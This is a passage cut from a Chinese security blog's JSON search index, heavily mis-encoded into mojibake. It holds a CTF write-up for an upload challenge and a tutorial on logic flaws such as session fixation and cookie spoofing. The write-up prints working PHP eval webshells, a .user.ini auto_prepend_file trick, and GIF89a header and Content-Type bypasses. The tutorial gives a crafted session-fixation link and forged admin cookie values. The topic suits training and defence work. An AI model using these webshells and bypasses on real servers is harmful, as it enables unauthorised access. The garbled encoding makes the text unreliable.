PHPä¼ªåè®®çŸ¥è¯†å‚è€ƒï¼š","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-easyupload","path":"/2023/08/02/easyupload/","content":"é¢˜ç›®æè¿°ï¼š ä¸€ååˆæ ¼çš„é»‘å®¢çœ¼ä¸­ï¼Œæ‰€æœ‰çš„ä¸Šä¼ ç‚¹éƒ½æ˜¯å¼€å‘è€…ç•™ä¸‹çš„åé—¨ é¢˜ç›®è§£é¢˜ï¼š è¿™é¢˜è§£é‡Šé•¿çŸ¥è¯†äº†ï¼ˆè¿˜æ˜¯å¤ªèœ~ï¼‰ é¦–å…ˆæ¯•ç«Ÿæ˜¯æ–°æ‰‹é¢˜ç›®ï¼Œäºæ˜¯è‡ªå·±æ‘¸ç´¢äº†ä¸€ä¼šå„¿ï¼Œé¦–å…ˆå°±æ˜¯ä¸Šä¼ shell.phpå‘ç°å¤±è´¥ï¼ŒçŒœæµ‹è‚¯å®šæ˜¯è¿‡æ»¤äº†phpåç¼€å•¥çš„ï¼Œæš‚ä¸è€ƒè™‘åç¼€åç»•è¿‡äº†ï¼Œè¿™æœ‰ç‚¹å¤ªå°å„¿ç§‘äº†ï¼ŒéšåbpæŠ“åŒ…ä¿®æ”¹äº†phpåç¼€å‘ç°ä»ç„¶æ²¡ç”¨ï¼Œé‚£è‚¯å®šå°±æ˜¯ä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹çš„ï¼Œä¹‹åå°è¯•äº†ä¸€ä¸ªå¾ˆæ­£å¸¸çš„jpgå›¾ç‰‡ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œè¿™æç¤ºæˆ‘ä»¬æ–‡ä»¶ç±»å‹ä¹Ÿå¾—æ­£ç¡®ï¼ˆè¿™ä¹Ÿæ˜¯åç»­è¦ç»•è¿‡çš„ï¼‰ï¼Œä¹‹åå°è¯•äº†å›¾ç‰‡é©¬ï¼Œä¾æ—§é”™è¯¯ï¼Œæ›´åŠ ç¡®å®šä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚ä¹‹åå°è¯•ç‰¹æ®Šçš„æ–‡ä»¶å¦‚.htaccessæ–‡ä»¶ä¸.usr.iniæ–‡ä»¶ï¼Œå‰è€…ä¸Šä¼ å¤±è´¥ï¼Œè€Œåè€…è¿”å›å¦‚ä¸‹å›¾çš„ä¿¡æ¯ è¿™è¡¨æ˜è¿™ä¸ªè·¯çº¿æœ‰è¯´æ³•ï¼Œè¿™é‡Œä¿¡æ¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ç±»å‹æœ‰é—®é¢˜ï¼Œå½“æ—¶åªæ˜¯è§‰å¾—ä¿®æ”¹typeç±»å‹å³å¯ï¼Œä½†è¿˜æ˜¯ä¼šå¤±è´¥ï¼Œç„¶åæˆ‘å°±çŸ¥è¯†ç›²åŒºäº†ï¼Œéšåçœ‹äº†wpï¼Œå‘ç°è¿™é“é¢˜ä¼šæ£€æµ‹æ–‡ä»¶å¤´ï¼Œæ–‡ä»¶å¤´ç¬¦åˆå›¾ç‰‡æ–‡ä»¶ç±»å‹çš„æ‰å¯ä»¥ã€‚ å¼€å§‹è§£é¢˜ å‚è€ƒwpå‘ç°ï¼š æœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹ä¸ºåˆ©ç”¨fastcgiçš„.user.iniç‰¹æ€§è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹ æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰phpå­—ç¬¦ä¸² æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯ æ–‡ä»¶MIMEç±»å‹ å¯¹äºç¬¬ä¸€ç‚¹å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä¾‹å¦‚ è¿™é‡Œè¡¥å……ä¸€ä¸‹çŸ¥è¯†ï¼š phpä¸­æœ€å¸¸è§çš„æ ‡ç­¾ä¸º &lt;?php @eval($_POST['a']);?&gt; ä¸è¿‡åœ¨é¢˜ç›®ä¸Šä¼ æ—¶å¯èƒ½ä¼šè¢«wafè¿‡æ»¤æ‰phpå…³é”®å­—ã€‚æ ¹æ®æŸ¥è¯¢ç»“æœï¼Œè¿˜æœ‰å››ç§phpçš„æ ‡ç­¾ï¼Œåˆ†åˆ«æ˜¯ï¼š â‘  ä»…åœ¨é…ç½®short_open_tag=onæ—¶å¯ä»¥ä½¿ç”¨ï¼Œé€‚åˆæ‰§è¡Œphpè¯­å¥ï¼› â‘¡å³ä½¿é…ç½®short_open_tag=offæ—¶ä¾ç„¶å¯ä»¥ä½¿ç”¨ï¼Œç›¸å½“äºï¼Œé€‚åˆè¾“å‡ºphpè¯­å¥~ ä¸Šè¿°äºŒè€…çš„çŸ­æ ‡ç­¾éƒ½ä¸å¿…é—­åˆï¼ˆå³?&gt;å¯ä»¥çœç•¥ä¸å†™ï¼Œä¹Ÿå¯ä»¥è¿æ¥æˆåŠŸï¼‰~ &lt;? @eval($_POST['a']);?&gt; &lt;?= @eval($_POST['a']);?&gt; &lt;? @eval($_POST['a']); &lt;?= @eval($_POST['a']); â‘¢&lt;% %&gt; æ®è¯´éœ€è¦é…ç½®php.iniæ–‡ä»¶ä¸­asp_tags=onï¼ˆphp.inié»˜è®¤çŠ¶æ€ä¸‹æ˜¯å…³é—­çš„ï¼‰ï¼Œä½†è¯¥ä½œè€…æœªåœ¨php.iniä¸­æ‰¾åˆ°è¯¥é€‰é¡¹â€¦ â‘£ php7åŠä¹‹åå®˜æ–¹å°±å·²ç»ä¸æ”¯æŒçš„å†™æ³• phpçŸ­æ ‡ç­¾å‚è€ƒ1ï¼šphpä¸­çš„çŸ­æ ‡ç­¾ å¤ªå‘äººäº† - dongguol - åšå®¢å›­ (cnblogs.com) phpçŸ­æ ‡ç­¾å‚è€ƒ2ï¼šæ— å­—æ¯æ•°å­—webshellæ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) å¯¹äºç¬¬äºŒç‚¹å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshell,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç«  https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚ è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚ å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚ ç¬¬ä¸‰ç‚¹ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œæ¯”å¦‚GIF89a å›¾ç‰‡é©¬éœ€è¦åœ¨.phpæ–‡ä»¶å‰å¢åŠ æ–‡ä»¶å¤´ï¼Œä¸Šä¼ æ—¶å¶å°”éœ€è¦é…åˆburpsuiteæŠ“åŒ…ä¿®æ”¹content-typeï¼Œå¸¸è§å›¾ç‰‡æ­é…æ ¼å¼å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š æ–‡ä»¶æ ¼å¼ php æ–‡ä»¶å¤´ content-type .jpg .jpe .jpeg JPGGraphic File image/jpeg .png PNG Image File image/png .gif GIF 89A image/gif è‹¥é¢˜ç›®è¦æ±‚ä¸Šä¼ å…¶ä»–æ ¼å¼çš„æ–‡ä»¶ï¼Œå¦‚docã€pdfã€dwgç­‰ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„åšæ–‡ï¼š å›¾ç‰‡é©¬å‚è€ƒ1ï¼šæ–‡ä»¶å¤´_iqiqiyaçš„åšå®¢-CSDNåšå®¢_gifæ–‡ä»¶å¤´ å›¾ç‰‡é©¬å‚è€ƒ2ï¼šContent-type_ç€šå¿„çš„åšå®¢-CSDNåšå®¢ ç¬¬å››ç‚¹ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type å› æ­¤æœ€ç»ˆçš„payloadä¸ºï¼šä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸º GIF89a auto_prepend_file=a.jpg ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º GIF89a &lt;?=eval($_POST['cmd']);?&gt; è¿™é‡Œä¹Ÿæ¶¨çŸ¥è¯†äº†ï¼Œåœ¨æ–‡ä»¶å†…å®¹å¤´éƒ¨æ·»åŠ GIF89aå±…ç„¶ä¹Ÿå¯ä»¥ï¼Ÿ æ¥ç€ä¸Šä¼ å›¾ç‰‡é©¬ F12æŸ¥çœ‹æ–‡ä»¶å»å‘ï¼ŒåŸå› æ˜¯ä½ ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¼šè¢«è¯¥ç½‘ç«™åŒç›®å½•ä¸‹çš„æ­£å¸¸phpæ–‡ä»¶æ‰€åŒ…å«ï¼Œå› æ­¤ä½ è¦çŸ¥é“ä½ åœ¨ä¸Šä¼ å›¾ç‰‡ä¹‹åï¼Œè¢«å“ªä¸ªphpæ–‡ä»¶åŒ…å« æ¥ç€æˆ‘ä»¬èšå‰‘è¿æ¥å³å¯ æˆåŠŸæ‰¾åˆ°flag å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è®¿é—®è¯¥ç½‘å€è¿›è¡Œæ‰‹åŠ¨æ¢ç´¢ æˆåŠŸæ‰¾åˆ°flagï¼Œåœ¨è¿™é‡Œä¹Ÿé‡åˆ°ä¸ªç¥å¥‡çš„é—®é¢˜ï¼Œæˆ‘åœ¨ä¸Šä¼ ä¸€æ®µæ—¶é—´åï¼Œè¯¥æœ¨é©¬æ–‡ä»¶å¤±æ•ˆäº†ï¼Œè¿™é‡Œä¹Ÿä¸çŸ¥é“æ˜¯ä½•åŸå›  å‚è€ƒæ–‡ç« ï¼š å¤ç°wp åŸºç¡€çŸ¥è¯†æ–‡ç« å‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"é€»è¾‘æ¼æ´","path":"/2023/07/29/qian-xi-luo-ji-lou-dong/","content":"æµ…æé€»è¾‘æ¼æ´ 1. æ¼æ´ä»‹ç» 1.1 æˆå›  è®¾è®¡é˜¶æ®µäº§ç”Ÿï¼Œè€å¸æœºä¹Ÿä¼šäº§ç”Ÿã€ç›¸å¯¹éš¾å‘ç°ã€éš¾ä»¥é˜²æŠ¤ï¼Œç›¸å¯¹å®¹æ˜“åˆ©ç”¨ ç¬¬ä¸‰æ–¹é€»è¾‘ç¼ºé™·ã€æ²¡æœ‰åœ¨è®¾è®¡åˆæœŸè¿›è¡Œå®‰å…¨å®¡è®¡ã€å®‰å…¨æ°´å¹³åŠå¯¹å®‰å…¨è®¤çŸ¥ç¨‹åº¦ä¸ä¸€è‡´ é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥æˆ–é€»è¾‘å¤ªå¤æ‚ï¼Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œä¸€èˆ¬å‡ºç°ä»»æ„å¯†ç ä¿®æ”¹ï¼ˆæ²¡æœ‰æ—§å¯†ç éªŒè¯ï¼‰ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰ã€‚ â€‹ é€»è¾‘æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ä¸šåŠ¡/åŠŸèƒ½ä¸Šçš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§, é€»è¾‘æ¼æ´çš„ç ´åæ–¹å¼å¹¶éæ˜¯å‘ç¨‹åºæ·»åŠ ç ´åå†…å®¹ï¼Œè€Œæ˜¯åˆ©ç”¨é€»è¾‘å¤„ç†ä¸ä¸¥å¯†æˆ–è€…ä»£ç é—®é¢˜æˆ–å›ºæœ‰ä¸è¶³ï¼Œæ“ä½œä¸Šå¹¶ä¸å½±å“ç¨‹åºçš„å…è®¸ï¼Œåœ¨é€»è¾‘ä¸Šæ˜¯é¡ºåˆ©æ‰§è¡Œçš„ã€‚ è¿™ç§æ¼æ´ä¸€èˆ¬é˜²æŠ¤æ‰‹æ®µæˆ–è®¾å¤‡æ— æ³•é˜»æ­¢ï¼Œå› ä¸ºèµ°çš„æ˜¯åˆæ³•æµé‡ä¹Ÿæ²¡æœ‰é˜²å¾¡æ ‡å‡†ã€‚ 1.2 åˆ†æ â€‹ å¯¹å¸¸è§çš„æ¼æ´è¿›è¡Œè¿‡ç»Ÿè®¡ï¼Œå‘ç°å…¶ä¸­è¶Šæƒæ“ä½œå’Œé€»è¾‘æ¼æ´å æ¯”æœ€é«˜ï¼Œå¾ˆå¤šå¹³å°ä¸­åŸºæœ¬éƒ½æœ‰å‘ç°ï¼ŒåŒ…æ‹¬ä»»æ„æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ã€ä»»æ„åˆ é™¤ç­‰è¡Œä¸ºï¼›æœ€ä¸¥é‡çš„æ¼æ´å‡ºç°åœ¨è´¦å·å®‰å…¨ï¼ŒåŒ…æ‹¬é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç ã€éªŒè¯ç æš´åŠ›ç ´è§£ç­‰ã€‚ é€»è¾‘æ¼æ´çš„é‡è¦æ€§ å¸¸è§çš„OWASPæ¼æ´ï¼Œé€šè¿‡æ¼æ´æ‰«æå·¥å…·ï¼Œå¤§å¤šæ”¯æŒè‡ªåŠ¨åŒ–æˆ–è€…åŠè‡ªåŠ¨åŒ–æ‰«æå‡ºæ¥ï¼Œå¹¶ä¸”ä¼ ç»Ÿçš„å®‰å…¨è®¾å¤‡æˆ–è€…é˜²æŠ¤æªæ–½æ”¶æ•ˆç”šå¾® â€‹ ä½†é€»è¾‘æ¼æ´æ˜¯å’Œç³»ç»Ÿè‡ªèº«åŠŸèƒ½å’Œé€»è¾‘æœ‰å…³ç³»çš„æ¼æ´ï¼Œæ¯ä¸€å®¶çš„æ¼æ´å‡ºç°å¯èƒ½å­˜åœ¨ä¸€å®šçš„ç‹¬ç‰¹æ€§ï¼Œå¾ˆéš¾å¤åˆ¶æˆ–è€…é€šè¿‡è§„åˆ™è„šæœ¬å’Œæ¼æ‰«å·¥å…·æ‰«æå‡ºæ¥ï¼Œå› æ­¤é€»è¾‘æ¼æ´å¤§å¤šéœ€è¦é…åˆä»£ç å®¡è®¡å’Œæ‰‹æ®µæµ‹è¯•æ‰å¯ä»¥å‘ç°ç›¸å…³æ¼æ´ï¼Œä¹Ÿæ˜¯å·¥å…·æ— æ³•ä»£æ›¿äººå·¥çš„æ¼æ´ã€‚ 2. é€»è¾‘æ¼æ´è¯¦è§£ 2.1 å¸¸è§çš„é€»è¾‘æ¼æ´ é€»è¾‘æ¼æ´çš„åˆ†ç±» è¶Šæƒæ¼æ´ å¯†ç éœ€æ”¹ å¯†ç æ‰¾å› éªŒè¯ç æ¼æ´ æ”¯ä»˜æ¼æ´ æŠ•ç¥¨/ç§¯åˆ†/æŠ½å¥– çŸ­ä¿¡è½°ç‚¸ å³ï¼šäº¤æ˜“æ”¯ä»˜ã€å¯†ç ä¿®æ”¹ã€å¯†ç æ‰¾å›ã€è¶Šæƒä¿®æ”¹ã€è¶ŠæƒæŸ¥è¯¢ã€çªç ´é™åˆ¶ç­‰å„ç±»é€»è¾‘æ¼æ´ã€‚ 2.2 å¦‚ä½•æŒ–æ˜é€»è¾‘æ¼æ´ ç¡®å®šä¸šåŠ¡æµç¨‹---&gt;å¯»æ‰¾æµç¨‹ä¸­å¯ä»¥è¢«æ“æ§çš„ç¯èŠ‚---&gt;åˆ†æå¯è¢«æ“æ§ç¯èŠ‚ä¸­å¯èƒ½äº§ç”Ÿçš„é€»è¾‘é—®é¢˜---&gt;å°è¯•ä¿®æ”¹å‚æ•°è§¦å‘é€»è¾‘é—®é¢˜ 2.3 èº«ä»½éªŒè¯æ¼æ´ 1. æš´åŠ›ç ´è§£æ¼æ´ æ¼æ´ä»‹ç»ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´è·å–ç”¨æˆ·åå’Œå¯¹åº”å¼±å£ä»¤å¯†ç ï¼Œå¹¶è¿›è¡Œç™»å½•æ“ä½œ æ¼æ´åŸç†ï¼šç”±äºæ²¡æœ‰è®¾ç½®ç™»å½•å¤±è´¥æ¬¡æ•°é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡å£ä»¤å­—å…¸è¿›è¡Œç‰¹å®šç”¨æˆ·çš„å¯†ç çˆ†ç ´æˆ–é€šè¿‡ç”¨æˆ·åå­—å…¸è¿›è¡Œç‰¹å®šå¼±å£ä»¤çš„ç”¨æˆ·æšä¸¾ æ¼æ´ç‚¹ï¼šç³»ç»Ÿç™»å½•ç‚¹ æ¼æ´ä¿®å¤ï¼š å¯¹äºå›ºå®šç”¨æˆ·åçˆ†ç ´å¯†ç  å¯ä»¥é’ˆå¯¹ç”¨æˆ·åè¿›è¡Œé”™è¯¯æ¬¡æ•°è®¡ç®—ï¼Œé«˜äºä¸€å®šé˜ˆå€¼è´¦å·é”å®šä¸€æ®µæ—¶é—´ï¼Œæˆ–è€…æ·»åŠ éªŒè¯ç  ä½†æ˜¯ä¸èƒ½æ°¸ä¹…é”å®šï¼Œå¯èƒ½è¢«ç”¨æ¥è¿›è¡Œè´¦æˆ·æ¶æ„é”å®š å¯¹äºå›ºå®šå¯†ç æšä¸¾ç”¨æˆ·åã€ éœ€è¦è®¡ç®—IPå¯¹URLçš„è¯·æ±‚æƒ…å†µï¼ŒæŸä¸ªIPçŸ­æ—¶é—´å¤§é‡è¯·æ±‚ç™»å½•åº”è¯¥åŠ å…¥é»‘åå• è¿›è¡Œä¼ è¾“æ•°æ®åŠ å¯†æœ‰ä¸€å®šçš„é˜²æŠ¤æ•ˆæœ 2. Sessionå›ºå®šæ”»å‡» æ¼æ´ä»‹ç»ï¼šä¼šè¯å›ºå®šæ”»å‡»æ˜¯åˆ©ç”¨æœåŠ¡å™¨çš„sessionä¸å˜æœºåˆ¶ï¼Œå€Ÿä»–äººä¹‹æ‰‹è·å¾—è®¤è¯å’Œæˆæƒï¼Œç„¶åå†’å……ä»–äºº æ¼æ´åŸç†ï¼šåœ¨è¯·æ±‚ç™»å½•è¿‡ç¨‹æ—¶å€™ï¼ŒURLå¸¦æœ‰ä¸€ä¸ªsessionï¼Œç™»å½•æˆåŠŸä¹‹åä¼šå°†ç™»å½•æˆåŠŸçš„ä¿¡æ¯ç»‘å®šåˆ°è¿™ä¸ªsessionä¸­ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€å¸¦æœ‰sessionçš„URLç»™ç›¸å…³å·¥ä½œäººå‘˜è¯±å¯¼å…¶ç™»å½•ï¼Œç›¸å½“äºè·å–äº†å…¶èº«ä»½ä¿¡æ¯ æ”»å‡»æµç¨‹ï¼š 1ã€æ”»å‡»è€…Attackerèƒ½æ­£å¸¸è®¿é—®è¯¥åº”ç”¨ç½‘ç«™ï¼› 2ã€åº”ç”¨ç½‘ç«™æœåŠ¡å™¨è¿”å›ä¸€ä¸ªä¼šè¯IDç»™ä»–ï¼› 3ã€æ”»å‡»è€…Attackerç”¨è¯¥ä¼šè¯IDæ„é€ ä¸€ä¸ªè¯¥ç½‘ç«™é“¾æ¥å‘ç»™å—å®³è€…Victimï¼› 4-5ã€å—å®³è€…Victimç‚¹å‡»è¯¥é“¾æ¥ï¼Œæºå¸¦æ”»å‡»è€…çš„ä¼šè¯IDå’Œè‡ªå·±çš„ç”¨æˆ·åå¯†ç æ­£å¸¸ç™»å½•äº†è¯¥ç½‘ç«™ï¼Œä¼šè¯æˆåŠŸå»ºç«‹ï¼› 6ã€æ”»å‡»è€…Attackerç”¨è¯¥ä¼šè¯IDæˆåŠŸå†’å……å¹¶åŠ«æŒäº†å—å®³è€…Victimçš„ä¼šè¯ã€‚ è¿™é‡Œç›¸å½“äºå—å®³è€…ç”¨è¯¥ä¼šè¯IDç™»å½•åï¼Œä¾¿å°†è¯¥ä¼šè¯IDææƒä¸ºç®¡ç†å‘˜äº†ï¼Œè€Œæˆ‘ä»¬æ”»å‡»è€…å‡­å€Ÿè¯¥ä¼šè¯IDå»ç™»å½•è¯¥ç½‘ç«™æ—¶ï¼ŒæˆåŠŸä»¥ç®¡ç†å‘˜çš„èº«ä»½è¿›å…¥ï¼Œå½“ç„¶è¿™é‡Œå—å®³è€…æ˜¯æ™®é€šç”¨æˆ·ä¹Ÿæ˜¯å¯ä»¥çš„ æ¼æ´ç‚¹ï¼šåœ¨GETæ–¹æ³•è¯·æ±‚ç™»å½•æ—¶å€™å¸¦æœ‰sessionå€¼ è®¿é—®ç½‘ç«™ï¼ˆæœªç™»å½•ï¼‰ï¼šè·å–cookieä¿¡æ¯ï¼Œè·å–sessionid ç™»å½•ç½‘ç«™ï¼šæŸ¥çœ‹cookieä¿¡æ¯ï¼Œè·å–sessionid æŸ¥çœ‹ç™»å½•å‰ï¼Œç™»å½•åsessionidæ˜¯å¦ç›¸åŒï¼Œè‹¥ç›¸åŒï¼Œåˆ™å­˜åœ¨è¯¥æ¼æ´ ä¿®å¤æ€è·¯ï¼š åªè¦é¿å…åœ¨URLä¸­å¸¦å…¥sessionä¿¡æ¯å³å¯æ¯”è¾ƒæœ‰æ•ˆçš„é˜²å¾¡ å¦å¤–ä¹Ÿè¦æ³¨æ„POSTè¯·æ±‚ä¸­å¸¦æœ‰sessionidè¿›è¡Œsessionå›ºå®šæ”»å‡»ï¼Œè™½ç„¶å¯åˆ©ç”¨æ€§æ¯”è¾ƒä½ï¼Œä½†æ˜¯å»ºè®®ä¿®å¤ æ¼æ´å®æˆ˜ è¿™é‡Œç”¨YXcmså»ºç«™ç³»ç»Ÿå¤ç°ï¼Œç”±äºæºä»£ç å¤ªéš¾æ‰¾äº†ï¼Œè¿™é‡Œå°±è·Ÿç€èµ°å§â€¦ å¤ç°è¿‡ç¨‹ yxcmså…è®¸æˆ‘ä»¬è‡ªå®šä¹‰sessionï¼Œè€Œä¸”è¿™ä¸ªè¿‡ç¨‹é€šè¿‡getæ–¹å¼æ¥å®Œæˆã€‚æˆ‘è§‰å¾—è¿™æ ·çš„é—®é¢˜å±äºCSRFï¼Œä¸ç»æ„ä¹‹é—´å°±èƒ½è·å–å¤§æ•ˆæœã€‚å…¶é—®é¢˜ä»£ç å¦‚ä¸‹ï¼š &lt;?php&lt;br&gt; //å…¬å…±ç±»&lt;br&gt; class commonController extends baseController{public function __construct()&lt;br&gt; {&lt;br&gt; parent::__construct();&lt;br&gt; if(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//é€šè¿‡GETæ–¹æ³•ä¼ é€’sessionid,firefox&lt;br&gt; session_starts();&lt;br&gt; â€¦â€¦ å½“$_GET[â€˜phpsessidâ€™]éç©ºæ—¶ï¼Œå°±ä»¤session_idä¸ºæˆ‘ä»¬ä¼ å…¥çš„å€¼ã€‚ äºæ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸ªé“¾æ¥è®©ç®¡ç†å‘˜ç‚¹å‡»ï¼Œç®¡ç†å‘˜ç‚¹å‡»åä¼šé‡æ–°è®¾ç½®ä»–çš„sessionï¼Œè€Œä¸”è¿™ä¸ªsessionå°±æ˜¯æˆ‘ä»¬æ„é€ çš„ã€‚å› ä¸ºsessioné‡ç½®äº†æ‰€ä»¥ç®¡ç†å‘˜ä¹Ÿéœ€è¦é‡æ–°ç™»å½•ï¼Œè€Œé‡æ–°ç™»å½•åå…¶session_idå°±æ˜¯æˆ‘ä»¬æ„é€ çš„ã€‚æˆ‘ä»¬åªè¦åˆ©ç”¨è¿™ä¸ªsession_idå°±èƒ½ç™»å½•ç®¡ç†åå°äº†ã€‚ æ¯”å¦‚æˆ‘æ„é€ ä¸€ä¸ªé“¾æ¥ï¼š http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456 å°†è¿™ä¸ªé“¾æ¥å‘ç»™å—å®³è€…ï¼ˆç«ç‹æµè§ˆå™¨ï¼‰ï¼Œè¯±ä½¿å—å®³è€…ç®¡ç†å‘˜ç‚¹å‡»è¯¥é“¾æ¥ï¼Œç‚¹å‡»ååä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œä½†æ­¤æ—¶ä»–çš„phpsessionå·²ç»æ˜¯æˆ‘ä»¬æ„é€ çš„f4cking456äº† æ­¤æ—¶å¦‚æœå—å®³è€…ç™»å½•è¿™ä¸ªç½‘å€ï¼Œé‚£ä¹ˆè¿™ä¸ªsessionå°±æœ‰åå°æƒé™äº†ã€‚ å‡å¦‚å—å®³è€…ç™»å½•è¯¥ç½‘å€ é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªé“¾æ¥ http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456ï¼Œå°†è‡ªå·±çš„sessionè®¾ç½®æˆf4cking456ï¼Œæˆ–è€…éšæ„æ€ä¹ˆä¿®æ”¹ï¼Œåªè¦æŠŠphpsessidä¿®æ”¹æˆf4cking123å°±èƒ½æ‹¥æœ‰åå°æƒé™äº† è¿™æ—¶æ”»å‡»è€…ï¼ˆè°·æ­Œæµè§ˆå™¨ï¼‰è®¿é—®è¯¥é“¾æ¥ï¼Œç›´æ¥è¿›å…¥åå°ç•Œé¢ æœ‰ä¸ªå‰æå°±æ˜¯ï¼Œå®æˆ˜è¿‡ç¨‹ä¸­ä½ éœ€è¦çŸ¥é“è¯¥ç½‘ç«™åå°åœ°å€æ˜¯ä»€ä¹ˆ 3. Cookieæ¬ºéª—æ¼æ´ æ¼æ´ä»‹ç»ï¼šé€šè¿‡ä¼ªé€ cookieä¿¡æ¯èƒ½å¤Ÿä¼ªé€ å…¶ä»–ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚ æ¼æ´åŸç†ï¼šå¼€å‘è€…ä¸ºäº†æ–¹ä¾¿å°†èº«ä»½ä¿¡æ¯/ç™»å½•ä¿¡æ¯æ˜æ–‡æˆ–è€…åªæ˜¯ç®€å•ç¼–ç ã€å“ˆå¸Œä¹‹åå­˜æ”¾åœ¨cookieä¸­ï¼Œç½‘ç«™é€šè¿‡è·å–å¾—åˆ°çš„cookieè¿›è¡Œæˆæƒæˆ–è€…èº«ä»½éªŒè¯ æ¼æ´ç‚¹ï¼šcookieä¸­æœ‰æ˜æ˜¾æˆ–è€…åªæ˜¯ç®€å•ç¼–ç ã€å“ˆå¸Œçš„å­—æ®µæ—¶å€™ ä¿®æ”¹lsLoginå€¼ä¸º1å¯ä»¥åˆ¤å®šä¸ºç”¨æˆ·å·²ç»ç™»å½• ä¿®æ”¹cookieä¸ºasp163=UserName=admin æ¼æ´ä¿®å¤ï¼š Cookieä¸åº”è¯¥å­˜å‚¨å¯ç†è§£çš„èº«ä»½ä¿¡æ¯å’Œç™»å½•ä¿¡æ¯ æŒ‰ç…§è§„å®šï¼Œcookieå¯¹èº«ä»½ä¿¡æ¯å’Œç™»å½•ä¿¡æ¯çš„å­˜å‚¨åªèƒ½é€šè¿‡å­˜å‚¨è¶³å¤Ÿé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²è¿›è¡Œï¼Œé¿å…ç¯¡æ”¹ æ¼æ´å®æˆ˜ å¤§ä½“å°±æ˜¯é€šè¿‡æŸç§æ‰‹æ®µè·å–å…¶ä»–ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜çš„cookieï¼Œè€Œç”±äºè¯¥cookieå­˜å‚¨çš„æ˜¯å¯ç†è§£çš„èº«ä»½ä¿¡æ¯å’Œç™»å½•ä¿¡æ¯ï¼Œåˆ™æ”»å‡»è€…è·å–è¯¥cookieåï¼Œå‡­å€Ÿè¯¥cookieç™»å½•ç½‘ç«™ä¾¿å¯ä»¥å®ç°å…å¯†ç™»å½•åˆ°å…¶ä»–ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜é¡µé¢ 2.4 æƒé™ç±»é€»è¾‘æ¼æ´ 